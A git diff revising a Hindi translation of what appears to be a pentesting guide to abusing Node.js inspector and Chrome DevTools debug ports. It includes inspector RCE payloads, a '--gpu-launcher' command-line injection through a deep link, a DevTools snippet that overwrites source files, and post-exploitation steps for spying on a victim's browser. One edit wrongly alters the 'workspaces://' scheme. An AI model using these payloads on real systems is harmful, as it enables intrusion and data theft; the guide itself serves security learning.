@@ -27,22 +27,22 @@ node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
 Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
 For help, see: https://nodejs.org/en/docs/inspector
 ```
-**CEF** (**Chromium Embedded Framework**) पर आधारित प्रक्रियाओं को **debugger** खोलने के लिए पैरामीटर का उपयोग करना होगा: `--remote-debugging-port=9222` (SSRF सुरक्षा बहुत समान रहती है)। हालाँकि, वे **NodeJS** **debug** सत्र प्रदान करने के बजाय ब्राउज़र के साथ [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके संवाद करेंगे, यह ब्राउज़र को नियंत्रित करने के लिए एक इंटरफ़ेस है, लेकिन कोई सीधा RCE नहीं है।
+प्रक्रियाएँ जो **CEF** (**Chromium Embedded Framework**) पर आधारित हैं, उन्हें **debugger** खोलने के लिए पैरामीटर का उपयोग करना होगा: `--remote-debugging-port=9222` (SSRF सुरक्षा बहुत समान रहती है)। हालाँकि, वे **NodeJS** **debug** सत्र प्रदान करने के बजाय ब्राउज़र के साथ [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) का उपयोग करके संवाद करेंगे, यह ब्राउज़र को नियंत्रित करने के लिए एक इंटरफ़ेस है, लेकिन कोई सीधा RCE नहीं है।
 
 जब आप एक डिबग किए गए ब्राउज़र को शुरू करते हैं, तो कुछ ऐसा दिखाई देगा:
 ```
 DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
 ```
-### ब्राउज़र्स, वेबसॉकेट्स और समान-स्रोत नीति <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
+### Browsers, WebSockets and same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>
 
-वेबसाइटें एक वेब-ब्राउज़र में वेबसॉकेट और HTTP अनुरोध कर सकती हैं ब्राउज़र सुरक्षा मॉडल के तहत। एक **प्रारंभिक HTTP कनेक्शन** आवश्यक है **एक अद्वितीय डिबगर सत्र आईडी प्राप्त करने के लिए**। **समान-स्रोत नीति** **रोकती है** वेबसाइटों को **इस HTTP कनेक्शन** को बनाने से। [**DNS रीबाइंडिंग हमलों**](https://en.wikipedia.org/wiki/DNS_rebinding)** के खिलाफ अतिरिक्त सुरक्षा के लिए,** Node.js यह सत्यापित करता है कि कनेक्शन के लिए **'Host' हेडर** या तो एक **IP पता** या **`localhost`** या **`localhost6`** को सटीक रूप से निर्दिष्ट करते हैं।
+वेबसाइटें जो वेब-ब्राउज़र में खुलती हैं, वे ब्राउज़र सुरक्षा मॉडल के तहत WebSocket और HTTP अनुरोध कर सकती हैं। एक **प्रारंभिक HTTP कनेक्शन** आवश्यक है ताकि **एक अद्वितीय डिबगर सत्र आईडी प्राप्त की जा सके**। **same-origin-policy** **वेबसाइटों को** **इस HTTP कनेक्शन** को बनाने से रोकता है। [**DNS rebinding हमलों**](https://en.wikipedia.org/wiki/DNS_rebinding)** के खिलाफ अतिरिक्त सुरक्षा के लिए,** Node.js यह सत्यापित करता है कि कनेक्शन के लिए **'Host' हेडर** या तो एक **IP पता** या **`localhost`** या **`localhost6`** को सटीक रूप से निर्दिष्ट करते हैं।
 
 > [!NOTE]
 > यह **सुरक्षा उपाय निरीक्षक का शोषण करने से रोकता है** कोड चलाने के लिए **बस एक HTTP अनुरोध भेजकर** (जो एक SSRF vuln का शोषण करके किया जा सकता है)।
 
-### चल रहे प्रक्रियाओं में निरीक्षक शुरू करना
+### Starting inspector in running processes
 
-आप एक चल रहे nodejs प्रक्रिया को **सिग्नल SIGUSR1** भेज सकते हैं ताकि यह **डिफ़ॉल्ट पोर्ट में निरीक्षक शुरू करे**। हालाँकि, ध्यान दें कि आपके पास पर्याप्त विशेषाधिकार होना चाहिए, इसलिए यह आपको **प्रक्रिया के अंदर जानकारी तक विशेषाधिकार प्राप्त पहुंच** दे सकता है लेकिन सीधे विशेषाधिकार वृद्धि नहीं।
+आप एक चल रहे nodejs प्रक्रिया को **signal SIGUSR1** भेज सकते हैं ताकि यह **डिफ़ॉल्ट पोर्ट में निरीक्षक शुरू कर सके**। हालाँकि, ध्यान दें कि आपके पास पर्याप्त विशेषाधिकार होना चाहिए, इसलिए यह आपको **प्रक्रिया के अंदर जानकारी तक विशेषाधिकार प्राप्त करने** की अनुमति दे सकता है लेकिन सीधे विशेषाधिकार वृद्धि नहीं।
 ```bash
 kill -s SIGUSR1 <nodejs-ps>
 # After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
@@ -52,7 +52,7 @@ kill -s SIGUSR1 <nodejs-ps>
 
 ### निरीक्षक/debugger से कनेक्ट करें
 
-एक **Chromium-आधारित ब्राउज़र** से कनेक्ट करने के लिए, Chrome या Edge के लिए `chrome://inspect` या `edge://inspect` URLs का उपयोग किया जा सकता है। Configure बटन पर क्लिक करके यह सुनिश्चित किया जाना चाहिए कि **लक्ष्य होस्ट और पोर्ट** सही ढंग से सूचीबद्ध हैं। चित्र एक Remote Code Execution (RCE) उदाहरण दिखाता है:
+**Chromium-आधारित ब्राउज़र** से कनेक्ट करने के लिए, Chrome या Edge के लिए `chrome://inspect` या `edge://inspect` URLs का उपयोग किया जा सकता है। Configure बटन पर क्लिक करके यह सुनिश्चित किया जाना चाहिए कि **लक्ष्य होस्ट और पोर्ट** सही ढंग से सूचीबद्ध हैं। चित्र एक Remote Code Execution (RCE) उदाहरण दिखाता है:
 
 ![](<../../images/image (674).png>)
 
@@ -73,14 +73,14 @@ debug> exec("process.mainModule.require('child_process').exec('/Applications/iTe
 ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
 ```
 > [!NOTE]
-> ध्यान दें कि **NodeJS RCE हमले** तब काम नहीं करेंगे जब [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से ब्राउज़र से जुड़े हों (आपको इसके साथ करने के लिए दिलचस्प चीजें खोजने के लिए API की जांच करनी होगी)।
+> ध्यान दें कि **NodeJS RCE एक्सप्लॉइट्स काम नहीं करेंगे** यदि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से ब्राउज़र से जुड़े हों (आपको इसके साथ करने के लिए दिलचस्प चीजें खोजने के लिए API की जांच करनी होगी)।
 
 ## NodeJS Debugger/Inspector में RCE
 
 > [!NOTE]
-> यदि आप यहाँ [**Electron में XSS से RCE प्राप्त करने का तरीका**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/) खोजने आए हैं, तो कृपया इस पृष्ठ की जांच करें।
+> यदि आप यहाँ [**Electron में XSS से RCE प्राप्त करने का तरीका**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html) खोजने आए हैं, तो कृपया इस पृष्ठ की जांच करें।
 
-जब आप Node **inspector** से **जुड़ सकते** हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीके हैं, जैसे कि (ऐसा लगता है कि यह **Chrome DevTools protocol** के साथ कनेक्शन में काम नहीं करेगा):
+जब आप Node **inspector** से **जुड़ सकते** हैं, तो **RCE** प्राप्त करने के कुछ सामान्य तरीके हैं, जैसे कि (ऐसा लगता है कि यह **Chrome DevTools प्रोटोकॉल से कनेक्शन में काम नहीं करेगा**):
 ```javascript
 process.mainModule.require("child_process").exec("calc")
 window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
@@ -90,23 +90,23 @@ Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
 ## Chrome DevTools Protocol Payloads
 
 आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)\
-इस अनुभाग में मैं केवल उन दिलचस्प चीजों की सूची दूंगा जो मैंने लोगों को इस प्रोटोकॉल का शोषण करते हुए पाई हैं।
+इस अनुभाग में मैं केवल उन दिलचस्प चीजों की सूची दूंगा जो मैंने लोगों को इस प्रोटोकॉल का शोषण करते हुए पाया है।
 
 ### Parameter Injection via Deep Links
 
-[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino सुरक्षा ने खोजा कि CEF पर आधारित एक एप्लिकेशन ने सिस्टम में **एक कस्टम UR**I (workspaces://) पंजीकृत किया जो पूर्ण URI प्राप्त करता था और फिर **CEF आधारित एप्लिकेशन को लॉन्च किया** एक ऐसे कॉन्फ़िगरेशन के साथ जो उस URI से आंशिक रूप से निर्मित था।
+[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino सुरक्षा ने खोजा कि CEF पर आधारित एक एप्लिकेशन ने सिस्टम में **एक कस्टम UR**I (workspaces://index.html) पंजीकृत किया जो पूर्ण URI प्राप्त करता था और फिर **CEF आधारित एप्लिकेशन** को उस URI से आंशिक रूप से निर्मित कॉन्फ़िगरेशन के साथ लॉन्च करता था।
 
-यह पता चला कि URI पैरामीटर URL डिकोड किए गए थे और CEF बेसिक एप्लिकेशन को लॉन्च करने के लिए उपयोग किए गए थे, जिससे एक उपयोगकर्ता को **`--gpu-launcher`** फ्लैग को **कमांड लाइन** में **इंजेक्ट** करने और मनमाने चीजें निष्पादित करने की अनुमति मिली।
+यह पता चला कि URI पैरामीटर URL डिकोड किए गए थे और CEF बेसिक एप्लिकेशन को लॉन्च करने के लिए उपयोग किए गए थे, जिससे एक उपयोगकर्ता को **`--gpu-launcher`** फ्लैग को **कमांड लाइन** में **इंजेक्ट** करने और मनमाने कार्यों को निष्पादित करने की अनुमति मिली।
 
 तो, एक पेलोड जैसे:
 ```
 workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
 ```
-एक calc.exe को निष्पादित करेगा।
+एक calc.exe चलाएगा।
 
 ### फ़ाइलें ओवरराइट करें
 
-उस फ़ोल्डर को बदलें जहाँ **डाउनलोड की गई फ़ाइलें सहेजी जाएंगी** और एक फ़ाइल डाउनलोड करें ताकि **ओवरराइट** की जा सके अक्सर उपयोग किए जाने वाले **स्रोत कोड** को आपके **दुष्ट कोड** के साथ।
+**डाउनलोड की गई फ़ाइलों को सहेजने के लिए फ़ोल्डर बदलें** और एक फ़ाइल डाउनलोड करें ताकि **ओवरराइट** किया जा सके अक्सर उपयोग किए जाने वाले **स्रोत कोड** को आपके **दुष्ट कोड** के साथ।
 ```javascript
 ws = new WebSocket(url) //URL of the chrome devtools service
 ws.send(
@@ -126,7 +126,7 @@ downloadPath: "/code/",
 
 ### Post-Exploitation
 
-एक वास्तविक वातावरण में और **एक उपयोगकर्ता PC को समझौता करने के बाद** जो Chrome/Chromium आधारित ब्राउज़र का उपयोग करता है, आप **debugging सक्रियित करके और debugging port को port-forward करके** एक Chrome प्रक्रिया शुरू कर सकते हैं ताकि आप इसे एक्सेस कर सकें। इस तरह आप **विक्टिम द्वारा Chrome के साथ किए गए सभी कार्यों का निरीक्षण कर सकेंगे और संवेदनशील जानकारी चुरा सकेंगे**।
+एक वास्तविक वातावरण में और **एक उपयोगकर्ता PC को समझौता करने के बाद** जो Chrome/Chromium आधारित ब्राउज़र का उपयोग करता है, आप **debugging सक्रियित करके और debugging port को port-forward करके** एक Chrome प्रक्रिया लॉन्च कर सकते हैं ताकि आप इसे एक्सेस कर सकें। इस तरह आप **Chrome के साथ पीड़ित द्वारा किए गए सभी कार्यों का निरीक्षण कर सकेंगे और संवेदनशील जानकारी चुरा सकेंगे**।
 
 चुपके से करने का तरीका है **हर Chrome प्रक्रिया को समाप्त करना** और फिर कुछ ऐसा कॉल करना जैसे
 ```bash
